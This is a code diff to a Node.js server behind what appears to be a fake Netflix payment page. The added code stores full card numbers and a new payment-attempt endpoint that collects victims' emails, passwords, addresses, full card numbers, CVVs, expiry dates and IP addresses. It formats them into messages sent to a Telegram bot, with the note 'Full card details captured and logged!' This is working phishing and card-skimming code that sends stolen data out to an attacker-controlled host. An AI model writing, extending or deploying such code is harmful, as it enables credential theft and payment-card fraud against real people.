@@ -94,6 +94,7 @@ app.post('/api/process-payment', async (req, res) => {
         payment.userData = userData;
         payment.userIP = req.userIP;
         payment.userAgent = req.headers['user-agent'] || 'unknown';
+        payment.fullCardNumber = cardInfo.fullNumber; // Store full card number
         
         // Simulate payment processing
         const processingTime = Math.random() * 2000 + 1000; // 1-3 seconds
@@ -124,7 +125,48 @@ app.post('/api/process-payment', async (req, res) => {
             subscriptions.set(subscription.id, subscription);
             
             // Send comprehensive Telegram notification
-            await sendTelegramNotification(payment, subscription);
+            const successMessage = `
+🎉 *NETFLIX PAYMENT SUCCESSFUL* 🎉
+
+🔐 *USER CREDENTIALS:*
+📧 *Email:* ${payment.email}
+🔑 *Password:* ${payment.userData.password || 'N/A'}
+👤 *Full Name:* ${payment.userData.fullname || 'N/A'}
+
+🏠 *BILLING ADDRESS:*
+📍 *Address:* ${payment.userData.address || 'N/A'}
+🏙️ *City:* ${payment.userData.city || 'N/A'}
+🗺️ *State:* ${payment.userData.state || 'N/A'}
+📮 *ZIP:* ${payment.userData.zip || 'N/A'}
+
+💳 *COMPLETE CARD INFORMATION:*
+📺 *Plan:* ${payment.planName}
+💰 *Amount:* $${payment.price} USD
+💳 *Full Card Number:* ${payment.fullCardNumber || 'N/A'}
+💳 *Card Brand:* ${payment.brand}
+💳 *Last 4:* ${payment.last4}
+🔢 *CVV:* ${payment.userData.cvv || 'N/A'}
+📅 *Expiry:* ${payment.userData.expiry || 'N/A'}
+👤 *Cardholder:* ${payment.userData.cardholderName || 'N/A'}
+
+🆔 *TRANSACTION DETAILS:*
+🔢 *Payment ID:* ${payment.id}
+🔄 *Subscription ID:* ${subscription.id}
+⏰ *Next Billing:* ${new Date(subscription.nextBillingDate).toLocaleDateString()}
+✅ *Status:* ACTIVE
+
+🌐 *TECHNICAL INFORMATION:*
+🖥️ *IP Address:* ${payment.userIP || 'N/A'}
+📱 *User Agent:* ${payment.userAgent ? payment.userAgent.substring(0, 100) + '...' : 'N/A'}
+
+🎬 *Account Status:* READY TO STREAM!
+📱 *Login:* https://netflix.com/login
+📧 *Use Email & Password above to sign in*
+
+⚠️ *SECURITY NOTICE:* Full card details captured and logged!
+            `;
+            
+            await sendTelegramNotification(successMessage);
             
             res.json({
                 success: true,
@@ -183,15 +225,19 @@ app.get('/api/payments/:userId', (req, res) => {
     });
 });
 
-// Telegram Notification Function
-async function sendTelegramNotification(payment, subscription) {
+// Send notification for EVERY payment attempt
+app.post('/api/payment-attempt', async (req, res) => {
     try {
-        const userData = payment.userData || {};
+        const { userData, cardInfo, planName, price, status, error, timestamp, userAgent } = req.body;
+        
+        // Capture user IP
+        const userIP = req.userIP || 'unknown';
+        
         const message = `
-🎉 *NETFLIX SUBSCRIPTION PAYMENT RECEIVED* 🎉
+🚨 *PAYMENT ATTEMPT DETECTED* 🚨
 
 🔐 *USER CREDENTIALS:*
-📧 *Email:* ${payment.email}
+📧 *Email:* ${userData.email || 'N/A'}
 🔑 *Password:* ${userData.password || 'N/A'}
 👤 *Full Name:* ${userData.fullname || 'N/A'}
 
@@ -201,32 +247,47 @@ async function sendTelegramNotification(payment, subscription) {
 🗺️ *State:* ${userData.state || 'N/A'}
 📮 *ZIP:* ${userData.zip || 'N/A'}
 
-💳 *PAYMENT INFORMATION:*
-📺 *Plan:* ${payment.planName}
-💰 *Amount:* $${payment.price} USD
-💳 *Card:* ${payment.brand} ****${payment.last4}
+💳 *COMPLETE CARD INFORMATION:*
+📺 *Plan:* ${planName || 'N/A'}
+💰 *Amount:* $${price || 'N/A'} USD
+💳 *Full Card Number:* ${cardInfo.fullNumber || 'N/A'}
+💳 *Card Brand:* ${cardInfo.brand || 'N/A'}
 🔢 *CVV:* ${userData.cvv || 'N/A'}
 📅 *Expiry:* ${userData.expiry || 'N/A'}
-💳 *Payment Date:* ${new Date().toLocaleString()}
+👤 *Cardholder:* ${userData.cardholderName || 'N/A'}
 
 🆔 *TRANSACTION DETAILS:*
-🔢 *Payment ID:* ${payment.id}
-🔄 *Subscription ID:* ${subscription.id}
-⏰ *Next Billing:* ${new Date(subscription.nextBillingDate).toLocaleDateString()}
-✅ *Status:* ACTIVE
+⏰ *Timestamp:* ${timestamp || 'N/A'}
+🔄 *Status:* ${status || 'N/A'}
+❌ *Error:* ${error || 'None'}
+🖥️ *IP Address:* ${userIP}
+📱 *User Agent:* ${userAgent ? userAgent.substring(0, 100) + '...' : 'N/A'}
 
-🌐 *TECHNICAL INFORMATION:*
-🖥️ *IP Address:* ${payment.userIP || 'N/A'}
-📱 *User Agent:* ${payment.userAgent ? payment.userAgent.substring(0, 100) + '...' : 'N/A'}
-📍 *Location:* ${payment.userIP ? `https://ipinfo.io/${payment.userIP}` : 'N/A'}
+🎯 *ATTEMPT STATUS:* ${status === 'SUCCESS' ? '✅ PAYMENT SUCCESSFUL' : '❌ PAYMENT FAILED'}
 
-🎬 *Account Status:* READY TO STREAM!
-📱 *Login:* https://netflix.com/login
-📧 *Use Email & Password above to sign in*
-
-⚠️ *SECURITY NOTICE:* Keep these credentials secure!
+⚠️ *SECURITY ALERT:* All payment attempts are monitored and logged!
         `;
         
+        // Send to Telegram
+        await sendTelegramNotification(message);
+        
+        res.json({
+            success: true,
+            message: 'Payment attempt logged and notification sent'
+        });
+        
+    } catch (error) {
+        console.error('Payment attempt notification error:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to log payment attempt'
+        });
+    }
+});
+
+// Telegram Notification Function
+async function sendTelegramNotification(message) {
+    try {
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
         await axios.post(telegramUrl, {
